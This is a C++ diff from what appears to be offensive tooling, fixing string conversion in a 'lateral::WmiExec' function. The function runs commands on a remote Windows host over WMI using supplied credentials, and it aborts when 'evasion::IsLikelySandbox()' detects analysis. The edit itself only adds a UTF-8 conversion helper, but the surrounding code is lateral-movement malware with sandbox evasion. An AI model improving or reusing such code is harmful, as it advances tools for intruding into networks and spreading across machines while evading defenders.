@@ -9,6 +9,16 @@
 
 namespace lateral {
 
+namespace {
+    std::wstring s2ws(const std::string& str) {
+        if (str.empty()) return std::wstring();
+        int size_needed = MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), NULL, 0);
+        std::wstring strTo(size_needed, 0);
+        MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), &strTo[0], size_needed);
+        return strTo;
+    }
+}
+
 std::string WmiExec(const std::string& target, const std::string& user, const std::string& pass, const std::string& cmd) {
     if (evasion::IsLikelySandbox()) {
         return "ERROR: Sandbox detected";
@@ -23,10 +33,10 @@ std::string WmiExec(const std::string& target, const std::string& user, const st
         // but we immediately redirect it with ConnectRemote.
         recon::WmiSession wmi;
 
-        std::wstring wtarget(target.begin(), target.end());
-        std::wstring wuser(user.begin(), user.end());
-        std::wstring wpass(pass.begin(), pass.end());
-        std::wstring wcmd(cmd.begin(), cmd.end());
+        std::wstring wtarget = s2ws(target);
+        std::wstring wuser = s2ws(user);
+        std::wstring wpass = s2ws(pass);
+        std::wstring wcmd = s2ws(cmd);
 
         // Parse domain if present in user (e.g. DOMAIN\user)
         std::wstring domain = L"";
